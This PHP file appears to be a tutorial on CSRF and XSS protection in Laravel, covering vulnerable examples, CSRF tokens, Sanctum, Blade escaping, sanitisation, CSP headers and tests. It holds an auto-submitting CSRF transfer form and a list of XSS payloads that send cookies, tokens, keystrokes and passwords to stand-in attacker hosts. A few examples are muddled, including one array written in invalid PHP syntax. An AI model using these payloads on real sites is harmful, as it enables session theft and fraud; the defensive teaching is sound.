<?php

// ============================================================================
// 05 - CSRF & XSS - Complete Security Mastery
// ============================================================================

// =============================================================================
// PART 1: CSRF - CROSS-SITE REQUEST FORGERY
// =============================================================================

// =============================================================================
// 1. DEMONSTRATING CSRF VULNERABILITY
// =============================================================================

/**
 * SCENARIO 1: A CSRF Attack in Action
 * 
 * Attacker creates a malicious website that tricks users into
 * making unwanted requests to legitimate sites
 */
class CsrfVulnerabilityExample
{
    /**
     * ❌ VULNERABLE: Form without CSRF protection
     */
    public function vulnerableTransferForm()
    {
        // This HTML would be in a Laravel view
        $html = <<<'HTML'
        <!-- User is logged into their bank -->
        <!-- Bank URL: https://bank.com -->
        
        <form action="https://bank.com/api/transfer" method="POST">
            <input type="hidden" name="to" value="attacker@evil.com">
            <input type="hidden" name="amount" value="1000">
            <input type="submit" value="Click here for free money!">
        </form>
        
        <!-- OR AUTOMATICALLY SUBMIT: -->
        <script>
            // When page loads, auto-submit the form
            document.forms[0].submit();
        </script>
        
        <!-- Victim's bank cookies are automatically sent! -->
        <!-- Bank processes transfer without knowing about the trick -->
        HTML;
        
        return $html;
    }
    
    /**
     * How the attack works step-by-step:
     */
    public function attackFlow()
    {
        $flow = [
            "1. User logs into bank.com" => [
                "Browser gets session cookie",
                "Cookie stored in browser",
                "User stays logged in"
            ],
            "2. User visits evil.com (without logging out)" => [
                "In new tab, still has bank.com cookies",
                "Cookies not deleted"
            ],
            "3. evil.com has hidden form" => [
                "Form targets bank.com/api/transfer",
                "Form auto-submits via JavaScript",
                "Browser doesn't know it's malicious"
            ],
            "4. Browser makes request to bank.com" => [
                "Browser AUTOMATICALLY includes session cookies",
                "Same-domain cookies sent automatically",
                "Bank sees valid session cookie"
            ],
            "5. Bank processes transfer" => [
                "Server sees valid cookie",
                "Thinks it's the user making the request",
                "Processes the $1000 transfer",
                "Attacker's account receives money"
            ],
            "6. User doesn't know until checking balance" => [
                "Transaction appears in history",
                "User wonders what happened",
                "Too late - money already transferred"
            ]
        ];
        
        return $flow;
    }
    
    /**
     * Why browsers send cookies automatically
     */
    public function whyCookiesSentAutomatically()
    {
        return [
            "Security Feature" => "Browsers auto-send cookies for convenience",
            "Same-Origin Policy" => "Cookies sent for requests to the same domain",
            "The Problem" => "Doesn't matter WHERE the request originates",
            "Result" => "Even requests from malicious sites include cookies"
        ];
    }
}

// =============================================================================
// 2. CSRF PROTECTION WITH TOKENS
// =============================================================================

/**
 * ✅ CSRF Protection: Token-Based Defense
 */
class CsrfProtectionExample
{
    /**
     * Safe form with CSRF token
     */
    public function safeTransferForm()
    {
        // In Laravel Blade template:
        $blade = <<<'BLADE'
        <form action="/api/transfer" method="POST">
            @csrf  <!-- Blade helper that expands to: -->
            
            <!-- <input type="hidden" name="_token" value="unique-random-string"> -->
            
            <input type="email" name="to" placeholder="Recipient">
            <input type="number" name="amount" placeholder="Amount">
            <button type="submit">Transfer</button>
        </form>
        BLADE;
        
        return $blade;
    }
    
    /**
     * How CSRF token protection works
     */
    public function howTokenProtects()
    {
        return [
            "1. User loads form" => [
                "Server generates unique random token",
                "Token stored in session on server",
                "Token embedded in form"
            ],
            "2. User submits form" => [
                "Token sent with form data",
                "Not in cookies - in POST body"
            ],
            "3. Server receives request" => [
                "Extracts token from POST data",
                "Looks up session token",
                "Compares - must match exactly"
            ],
            "4. Attacker tries to exploit" => [
                "Creates malicious form",
                "Doesn't know the user's unique token",
                "Can't guess it (too random, changes each session)",
                "Submits form without token OR with wrong token"
            ],
            "5. Server rejects attack" => [
                "Token missing or mismatched",
                "Server throws 419 error",
                "Transfer doesn't happen",
                "Attacker blocked!"
            ]
        ];
    }
    
    /**
     * Manual CSRF token inclusion
     */
    public function manualTokenInclusion()
    {
        $examples = [
            "In Blade @csrf helper" => '@csrf',
            
            "Manual hidden input" => 
                '<input type="hidden" name="_token" value="{{ csrf_token() }}">',
            
            "Function access" =>
                'csrf_token()  // Returns the token string',
            
            "Check middleware" =>
                'App\\Http\\Middleware\\VerifyCsrfToken'
        ];
        
        return $examples;
    }
    
    /**
     * CSRF token in AJAX/JavaScript
     */
    public function ajaxWithCsrfToken()
    {
        $javascript = <<<'JS'
        // 1. Get token from meta tag
        const token = document.querySelector('meta[name="csrf-token"]').content;
        
        // 2. Include in AJAX request
        fetch('/api/transfer', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': token  // Add to header
            },
            body: JSON.stringify({
                to: 'user@example.com',
                amount: 1000
            })
        })
        .then(response => response.json())
        .then(data => console.log(data));
        
        // OR with jQuery:
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': token
            }
        });
        
        // Now all AJAX requests include token
        $.post('/api/transfer', data);
        JS;
        
        return $javascript;
    }
    
    /**
     * Server-side token validation
     */
    public function serverValidation()
    {
        $php = <<<'PHP'
        // In routes/web.php
        Route::post('/transfer', function (Request $request) {
            // VerifyCsrfToken middleware automatically validates
            // If token is missing or invalid, throws:
            // TokenMismatchException → 419 Page Expired
            
            // If we reach here, token is valid!
            $transfer = new MoneyTransfer();
            $transfer->process($request);
            
            return redirect('/success');
        })->middleware('web');  // 'web' middleware includes VerifyCsrfToken
        
        // Middleware location:
        // app/Http/Middleware/VerifyCsrfToken.php
        
        // Exceptions (skip CSRF check):
        // app/Http/Middleware/VerifyCsrfToken.php
        protected $except = [
            'api/webhook/*',  // External webhooks
            'stripe/*'         // Third-party services
        ];
        PHP;
        
        return $php;
    }
    
    /**
     * Why attacker can't bypass token
     */
    public function whyTokenIsUnbypassable()
    {
        return [
            "Token is random" => "New token for each session, changes often",
            "Token is per-session" => "Can't reuse token from another session",
            "Token not in cookies" => "Sent in POST body, not auto-sent headers",
            "Same-origin policy" => "Cross-origin JS can't read the token",
            "No predictability" => "Can't guess or brute-force valid token"
        ];
    }
}

// =============================================================================
// 3. SANCTUM API TOKENS - WHY THEY'RE CSRF-SAFE
// =============================================================================

/**
 * ✅ Sanctum Tokens: Alternative to Sessions
 * 
 * Why API tokens are immune to CSRF attacks
 */
class SanctumApiExample
{
    /**
     * Creating personal access tokens
     */
    public function createApiToken()
    {
        $php = <<<'PHP'
        // Create token for a user
        $user = User::find(1);
        $token = $user->createToken('api-token')->plainTextToken;
        // Returns: "1|xxxxxxxxxxxx"
        // Format: [UserID]|[RandomToken]
        
        // Multiple tokens possible
        $readToken = $user->createToken('read-only')->plainTextToken;
        $writeToken = $user->createToken('write-access')->plainTextToken;
        
        // Revoke old tokens
        $user->tokens()->where('name', 'old-token')->delete();
        
        // List all tokens
        $user->tokens;
        PHP;
        
        return $php;
    }
    
    /**
     * Using tokens in API requests
     */
    public function usingTokensInRequests()
    {
        $examples = [
            "cURL" => 'curl -H "Authorization: Bearer 1|xxxx" https://api.example.com/user',
            
            "JavaScript Fetch" => <<<'JS'
            fetch('/api/user', {
                headers: {
                    'Authorization': 'Bearer 1|xxxx'
                }
            })
            JS,
            
            "Postman" => 'Authorization: Bearer 1|xxxx',
            
            "Python Requests" => "headers={'Authorization': 'Bearer 1|xxxx'}"
        ];
        
        return $examples;
    }
    
    /**
     * Why Sanctum tokens are CSRF-safe
     */
    public function whySanctumIsSafe()
    {
        return [
            "1. Token in header only" => [
                "Not in cookies",
                "Requires Authorization header",
                "Header must be explicitly set"
            ],
            "2. Browsers can't auto-add headers" => [
                "Cookies: auto-sent by browser",
                "Headers: only JavaScript can add them",
                "Malicious site's JS can't run on your origin"
            ],
            "3. Same-origin policy blocks theft" => [
                "Cross-origin fetch blocked",
                "Can't read response from different domain",
                "Token never exposed to malicious code"
            ],
            "4. Not vulnerable to CSRF" => [
                "Even if attacker makes request",
                "They can't set Authorization header",
                "Request rejected - no token"
            ],
            "5. CORS required for external access" => [
                "API must explicitly allow origins",
                "Malicious site not whitelisted",
                "Requests fail at browser level"
            ]
        ];
    }
    
    /**
     * Configuring Sanctum in Laravel
     */
    public function sanctumConfiguration()
    {
        $config = <<<'PHP'
        // config/sanctum.php
        
        'stateful' => explode(',', env('SANCTUM_STATEFUL_DOMAINS', sprintf(
            '%s%s',
            'localhost,localhost:3000,127.0.0.1,127.0.0.1:8000,::1',
            env('APP_URL') ? ','.parse_url(env('APP_URL'), PHP_URL_HOST) : ''
        ))),
        
        'middleware' => [
            'verify_csrf_token' => \App\Http\Middleware\VerifyCsrfToken::class,
        ],
        
        // In routes/api.php
        Route::middleware('auth:sanctum')->group(function () {
            Route::post('/transfer', TransferController::class);
            Route::get('/user', function (Request $request) {
                return $request->user();
            });
        });
        PHP;
        
        return $config;
    }
}

// =============================================================================
// PART 2: XSS - CROSS-SITE SCRIPTING
// =============================================================================

// =============================================================================
// 4. DEMONSTRATING XSS VULNERABILITY
// =============================================================================

/**
 * XSS Attack Demonstration
 */
class XssVulnerabilityExample
{
    /**
     * ❌ VULNERABLE: Stored XSS in comments
     */
    public function vulnerableCommentStorage()
    {
        $php = <<<'PHP'
        // VULNERABLE Controller
        Route::post('/comment', function (Request $request) {
            // Store user input directly - NO ESCAPING!
            Comment::create([
                'post_id' => $request->post_id,
                'author' => $request->author,
                'content' => $request->content  // ❌ DANGEROUS!
            ]);
            
            return redirect('/post/' . $request->post_id);
        });
        
        // VULNERABLE View
        @foreach($comments as $comment)
            <div class="comment">
                <strong>{{ $comment->author }}</strong>
                <p>{{ $comment->content }}</p>  // Escapes, but content came in dirty
            </div>
        @endforeach
        
        // If user enters comment:
        // "Great post! <img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\" + document.cookie)'>"
        
        // What happens:
        // 1. Comment stored in database
        // 2. When displayed, image tag renders
        // 3. Image fails to load (src=x doesn't exist)
        // 4. onerror event fires
        // 5. Cookies sent to attacker
        // 6. All users viewing this comment compromised!
        PHP;
        
        return $php;
    }
    
    /**
     * ❌ VULNERABLE: Reflected XSS in search
     */
    public function vulnerableReflectedXss()
    {
        $php = <<<'PHP'
        // VULNERABLE Controller
        Route::get('/search', function (Request $request) {
            $query = $request->query('q');
            $results = Post::where('title', 'like', "%$query%")->get();
            
            return view('search', [
                'query' => $query,  // ❌ Unescaped in view
                'results' => $results
            ]);
        });
        
        // VULNERABLE View
        <h1>Search results for: {{ $query }}</h1>
        
        // Even though {{ }} escapes, let's see the attack:
        // Attacker sends:
        // https://yoursite.com/search?q=<script>alert('hacked')</script>
        
        // Browser shows: "Search results for: &lt;script&gt;..."
        // Script doesn't execute because Blade escapes it
        
        // But if using {!! !!}:
        <h1>Search results for: {!! $query !!}</h1>
        // Script EXECUTES!
        PHP;
        
        return $php;
    }
    
    /**
     * ❌ VULNERABLE: DOM XSS with innerHTML
     */
    public function vulnerableDomXss()
    {
        $javascript = <<<'JS'
        // VULNERABLE JavaScript
        document.getElementById('submit').addEventListener('click', function() {
            let userInput = document.getElementById('comment').value;
            
            // Using innerHTML - DANGEROUS!
            document.getElementById('output').innerHTML = userInput;
            
            // If user enters: <img src=x onerror="stealData()">
            // The img tag is created and onerror fires!
            // User's data stolen!
        });
        
        // SAFE Alternative 1: Use textContent
        document.getElementById('output').textContent = userInput;
        // This treats input as plain text, not HTML
        
        // SAFE Alternative 2: Use createElement
        const p = document.createElement('p');
        p.textContent = userInput;  // Automatically escaped
        document.getElementById('output').appendChild(p);
        
        // SAFE Alternative 3: Use innerText
        document.getElementById('output').innerText = userInput;
        // Also treats as text
        JS;
        
        return $javascript;
    }
    
    /**
     * Common XSS payload examples
     */
    public function commonPayloads()
    {
        return [
            "Cookie stealing" => '<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
            
            "Session hijacking" => '<script>new Image().src="https://attacker.com/steal?token="+localStorage.token</script>',
            
            "Redirect to phishing" => '<script>window.location="https://fake-bank.com/login"</script>',
            
            "Malware download" => '<img src=x onerror="window.location=\'https://malware.com/download\'">',
            
            "Keylogger" => '<script>document.onkeypress=e=>fetch("https://attacker.com/key?k="+e.key)</script>',
            
            "DOM manipulation" => '<script>document.body.innerHTML="<h1>Hacked!</h1>"</script>',
            
            "Form hijacking" => '<script>document.querySelectorAll("input[type=password]").forEach(el=>el.onchange=()=>fetch("..."+el.value))</script>'
        ];
    }
}

// =============================================================================
// 5. XSS PROTECTION: BLADE TEMPLATE AUTO-ESCAPING
// =============================================================================

/**
 * ✅ Blade Auto-Escaping Protection
 */
class BladeEscapingExample
{
    /**
     * How {{ }} escapes output
     */
    public function doublebraceEscaping()
    {
        $examples = [
            "Input: <script>alert('xss')</script>" => 
                "Output: &lt;script&gt;alert('xss')&lt;/script&gt;",
            
            "Input: <img src=x onerror='steal()'>" =>
                "Output: &lt;img src=x onerror='steal()'&gt;",
            
            "Input: <a href='javascript:alert(1)'>click</a>" =>
                "Output: &lt;a href='javascript:alert(1)'&gt;click&lt;/a&gt;",
            
            "Input: ><script>alert(1)</script><" =>
                "Output: &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;"
        ];
        
        return $examples;
    }
    
    /**
     * HTML entities that get escaped
     */
    public function htmlEntitiesEscaped()
    {
        return [
            '<' => '&lt;' => 'Less than sign',
            '>' => '&gt;' => 'Greater than sign',
            '"' => '&quot;' => 'Double quote',
            "'" => '&#039;' => 'Single quote',
            '&' => '&amp;' => 'Ampersand'
        ];
    }
    
    /**
     * Safe user display in Blade
     */
    public function safeUserDisplay()
    {
        $blade = <<<'BLADE'
        <!-- Safe display of user input -->
        @foreach($comments as $comment)
            <div class="comment">
                <div class="author">
                    {{ $comment->author }}  <!-- Escaped -->
                </div>
                <div class="content">
                    {{ $comment->text }}  <!-- Escaped -->
                </div>
                <div class="created">
                    {{ $comment->created_at->format('M d, Y') }}  <!-- Escaped -->
                </div>
            </div>
        @endforeach
        
        <!-- Result: All user input is safe! -->
        <!-- Even if user tried to inject script tags, they're displayed as text -->
        BLADE;
        
        return $blade;
    }
    
    /**
     * Under the hood: What Blade does
     */
    public function underTheHood()
    {
        $php = <<<'PHP'
        // Blade {{ }} is equivalent to:
        
        // {{ $variable }}
        echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
        
        // htmlspecialchars() converts:
        // <  →  &lt;
        // >  →  &gt;
        // "  →  &quot;
        // '  →  &#039;
        // &  →  &amp;
        
        // Example:
        $userInput = '<img src=x onerror="alert(\'xss\')">';
        echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
        // Output: &lt;img src=x onerror=&quot;alert(&#039;xss&#039;)&quot;&gt;
        
        // Browser displays as text: <img src=x onerror="alert('xss')">
        // Script never executes!
        PHP;
        
        return $php;
    }
}

// =============================================================================
// 6. UNESCAPED OUTPUT: {!! !!} - WHEN AND WHY IT'S DANGEROUS
// =============================================================================

/**
 * ⚠️ Triple-Brace {!! !!} - Use With Extreme Caution
 */
class UnescapedOutputExample
{
    /**
     * What {!! !!} does
     */
    public function triplebraceComparison()
    {
        $blade = <<<'BLADE'
        <!-- Escaped (SAFE) -->
        {{ "<b>Bold Text</b>" }}
        <!-- Displays: &lt;b&gt;Bold Text&lt;/b&gt; (as text) -->
        
        <!-- Unescaped (DANGEROUS) -->
        {!! "<b>Bold Text</b>" !!}
        <!-- Displays: Bold Text (rendered as HTML) -->
        
        <!-- The difference: -->
        {{ }} = htmlspecialchars() = Safe
        {!! !!} = No escaping = Dangerous if user input
        BLADE;
        
        return $blade;
    }
    
    /**
     * ❌ DANGEROUS: Using {!! !!} with user input
     */
    public function dangerousUserInput()
    {
        $blade = <<<'BLADE'
        <!-- ❌ NEVER DO THIS -->
        @foreach($comments as $comment)
            <div>
                {!! $comment->content !!}  <!-- User input unescaped! -->
            </div>
        @endforeach
        
        <!-- User can enter: -->
        <!-- <img src=x onerror="stealCookies()"> -->
        
        <!-- Result: Script executes for all users viewing this page! -->
        <!-- Cookies stolen, sessions hijacked! -->
        BLADE;
        
        return $blade;
    }
    
    /**
     * ✅ SAFE: When to use {!! !!}
     */
    public function safeUnescapedUses()
    {
        $examples = [
            "Trusted admin content" => '{!! $page->richText !!}  // Admin wrote this',
            
            "Markdown conversion" => '{!! Markdown::parse($article) !!}  // Library handles security',
            
            "System-generated HTML" => '{!! $systemNotification !!}  // Your code generated this',
            
            "Third-party rich text" => '{!! $sanitizer->clean($userHtml) !!}  // Sanitized first',
            
            "SVG/Graphics" => '{!! $chartSvg !!}  // You generated this SVG'
        ];
        
        return $examples;
    }
    
    /**
     * Safe pattern: Sanitize before unescaping
     */
    public function sanitizeBeforeUnescaping()
    {
        $php = <<<'PHP'
        // Install: composer require stevebauman/purify
        use Stevebauman\Purify\Facades\Purify;
        
        Route::post('/comment', function (Request $request) {
            $userHtml = $request->input('html_content');
            
            // 1. Sanitize (remove malicious tags, keep safe ones)
            $clean = Purify::clean($userHtml);
            
            // 2. Store sanitized version
            $comment = Comment::create([
                'content' => $clean
            ]);
            
            return redirect('/post/' . $comment->post_id);
        });
        
        // In view: Now safe to use {!! !!} because content was sanitized
        @foreach($comments as $comment)
            <div>{!! $comment->content !!}</div>  <!-- Safe! -->
        @endforeach
        
        // What Purify does:
        // Input:  <b>Bold</b><script>alert(1)</script>
        // Output: <b>Bold</b>  <!-- Script removed -->
        PHP;
        
        return $php;
    }
    
    /**
     * Best practice: Always use {{ }} for user input
     */
    public function bestPractice()
    {
        $blade = <<<'BLADE'
        <!-- Default to {{ }} for ALL user input -->
        
        <!-- User's name -->
        <p>Hello {{ $user->name }}</p>
        
        <!-- User's bio -->
        <p>{{ $user->bio }}</p>
        
        <!-- User's comment -->
        <p>{{ $comment->text }}</p>
        
        <!-- User's email -->
        <p>{{ $user->email }}</p>
        
        <!-- If you need to render HTML, SANITIZE FIRST -->
        <!-- Then use {!! !!} -->
        
        <!-- Rule: Default = {{ }}, Exception = {!! !!} with sanitization -->
        BLADE;
        
        return $blade;
    }
}

// =============================================================================
// 7. COMPREHENSIVE SECURITY PATTERNS
// =============================================================================

/**
 * ✅ Production-Ready Security Patterns
 */
class SecurityPatterns
{
    /**
     * Secure form handling
     */
    public function secureFormHandling()
    {
        $php = <<<'PHP'
        // Secure blog comment form
        Route::post('/post/{post}/comment', function (Request $request, Post $post) {
            // 1. CSRF token automatically validated by middleware
            
            // 2. Validate input
            $validated = $request->validate([
                'content' => 'required|string|max:1000'
            ]);
            
            // 3. Store safely (no pre-escaping)
            $comment = $post->comments()->create([
                'user_id' => auth()->id(),
                'content' => $validated['content']  // Store as-is
            ]);
            
            // 4. Display safely
            return view('comments.show', ['comment' => $comment]);
        });
        
        // In view - ALWAYS escape
        @foreach($post->comments as $comment)
            <div class="comment">
                <strong>{{ $comment->user->name }}</strong>
                <p>{{ $comment->content }}</p>  <!-- {{ }} escapes automatically -->
            </div>
        @endforeach
        PHP;
        
        return $php;
    }
    
    /**
     * Secure API with Sanctum
     */
    public function secureApiWithSanctum()
    {
        $php = <<<'PHP'
        // API route with Sanctum
        Route::middleware('auth:sanctum')->group(function () {
            
            // Transfer money
            Route::post('/transfer', function (Request $request) {
                // Token already validated by middleware
                // No CSRF token needed (token in header, not cookie)
                
                $user = auth()->user();
                $amount = $request->input('amount');
                
                // Process transfer
                $transfer = new MoneyTransfer();
                $transfer->execute($user, $amount);
                
                return response()->json(['success' => true]);
            });
            
            // Get user data
            Route::get('/user', function (Request $request) {
                return $request->user();
            });
        });
        
        // Client usage:
        // const token = localStorage.getItem('api_token');
        // fetch('/api/transfer', {
        //     method: 'POST',
        //     headers: {
        //         'Authorization': `Bearer ${token}`,
        //         'Content-Type': 'application/json'
        //     },
        //     body: JSON.stringify({ amount: 100 })
        // });
        PHP;
        
        return $php;
    }
    
    /**
     * Content Security Policy headers
     */
    public function contentSecurityPolicy()
    {
        $php = <<<'PHP'
        // In app/Http/Middleware/SecurityHeaders.php
        
        public function handle($request, Closure $next)
        {
            $response = $next($request);
            
            // Prevent XSS attacks
            $response->header('X-Content-Type-Options', 'nosniff');
            $response->header('X-Frame-Options', 'DENY');
            $response->header('X-XSS-Protection', '1; mode=block');
            
            // Content Security Policy
            $csp = "default-src 'self'; " .
                   "script-src 'self' 'unsafe-inline' https://cdn.example.com; " .
                   "style-src 'self' 'unsafe-inline'; " .
                   "img-src 'self' data: https:; " .
                   "font-src 'self' data:; " .
                   "connect-src 'self' https://api.example.com; " .
                   "frame-ancestors 'none'; " .
                   "base-uri 'self'; " .
                   "form-action 'self'";
            
            $response->header('Content-Security-Policy', $csp);
            
            return $response;
        }
        
        // Register middleware in app/Http/Kernel.php
        protected $middleware = [
            // ...
            \App\Http\Middleware\SecurityHeaders::class,
        ];
        PHP;
        
        return $php;
    }
    
    /**
     * Input validation and sanitization
     */
    public function inputValidationSanitization()
    {
        $php = <<<'PHP'
        Route::post('/create-post', function (Request $request) {
            // 1. Validate
            $validated = $request->validate([
                'title' => 'required|string|max:255',
                'slug' => 'required|string|unique:posts',
                'content' => 'required|string|max:10000',
                'author_id' => 'required|exists:users,id'
            ]);
            
            // 2. Sanitize if needed
            $validated['title'] = trim(strip_tags($validated['title']));
            $validated['slug'] = str()->slug($validated['slug']);
            
            // 3. For rich text, use sanitizer
            if (!empty($validated['content'])) {
                $validated['content'] = Purify::clean($validated['content']);
            }
            
            // 4. Create model
            $post = Post::create($validated);
            
            // 5. Display safely
            return view('posts.show', ['post' => $post]);
        });
        
        // In view - no extra escaping needed
        <h1>{{ $post->title }}</h1>  <!-- Safe! -->
        {!! $post->content !!}  <!-- Safe! (was sanitized) -->
        PHP;
        
        return $php;
    }
}

// =============================================================================
// 8. TESTING AND VERIFICATION
// =============================================================================

/**
 * ✅ Testing for CSRF and XSS Vulnerabilities
     */
class SecurityTesting
{
    /**
     * Unit test for CSRF protection
     */
    public function testCsrfProtection()
    {
        $php = <<<'PHP'
        // Test case
        public function testTransferRequiresCsrfToken()
        {
            // Attempt without token
            $response = $this->post('/api/transfer', [
                'to' => 'user@example.com',
                'amount' => 1000
            ]);
            
            // Should be rejected
            $response->assertStatus(419);  // Page Expired
        }
        
        public function testTransferWithValidToken()
        {
            // Use CSRF token
            $response = $this->post('/api/transfer', [
                'to' => 'user@example.com',
                'amount' => 1000
            ], [
                'X-CSRF-TOKEN' => csrf_token()
            ]);
            
            // Should succeed
            $response->assertStatus(200);
        }
        PHP;
        
        return $php;
    }
    
    /**
     * Test for XSS vulnerabilities
     */
    public function testXssProtection()
    {
        $php = <<<'PHP'
        public function testCommentEscapesHtml()
        {
            $malicious = '<img src=x onerror="alert(\'xss\')">';
            
            $response = $this->post('/comment', [
                'content' => $malicious
            ]);
            
            // Check that HTML is escaped in response
            $this->assertStringContainsString(
                htmlspecialchars($malicious),
                $response->content()
            );
            
            // Check that script tag doesn't execute
            $this->assertStringNotContainsString('<img src=x onerror', $response->content());
        }
        
        public function testUserInputDisplayed()
        {
            $comment = Comment::create(['content' => '<b>Bold</b>']);
            
            $response = $this->get('/comments/' . $comment->id);
            
            // Should show escaped version
            $response->assertSee('&lt;b&gt;Bold&lt;/b&gt;');
        }
        PHP;
        
        return $php;
    }
}

// =============================================================================
// SUMMARY: Security Checklist
// =============================================================================

$securityChecklist = [
    "CSRF Protection" => [
        "✅ Use @csrf in all forms",
        "✅ Include token in AJAX requests",
        "✅ Use Sanctum for APIs (token in header)",
        "✅ Never disable CSRF middleware",
        "✅ Validate token on server"
    ],
    
    "XSS Prevention" => [
        "✅ Always use {{ }} for user input",
        "✅ Only use {!! !!} for trusted content",
        "✅ Sanitize HTML before storing",
        "✅ Use Content-Security-Policy headers",
        "✅ Never use innerHTML with user input"
    ],
    
    "General Security" => [
        "✅ Validate all input on server",
        "✅ Use prepared statements (Eloquent ORM)",
        "✅ Set security headers",
        "✅ Keep Laravel updated",
        "✅ Use environment variables for secrets",
        "✅ Enable HTTPS only",
        "✅ Use SameSite cookies"
    ]
];


